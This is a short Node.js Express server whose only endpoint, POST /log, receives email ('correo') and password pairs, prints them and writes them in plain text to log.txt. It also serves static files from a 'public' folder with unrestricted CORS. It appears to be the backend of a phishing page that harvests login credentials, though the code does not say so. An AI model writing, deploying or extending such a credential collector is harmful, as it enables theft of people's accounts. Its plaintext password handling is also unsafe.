const express = require('express');
const fs = require('fs');
const cors = require('cors')

const app = express();

app.use( cors() );
app.use( express.json() );
app.use( express.static('public') );

app.post('/log', ( req, res ) => {

    const { correo, pass } = req.body;
    const data = correo + " + " + pass;

    console.log( data );
    
    fs.writeFileSync( __dirname + '/log.txt', data, {
        encoding: 'utf-8'
    });
    
    res.status(200).json({
        msg:'Nice'
    }); 
    
})

app.listen( 8080, () => {
    console.log('app iniciada');
})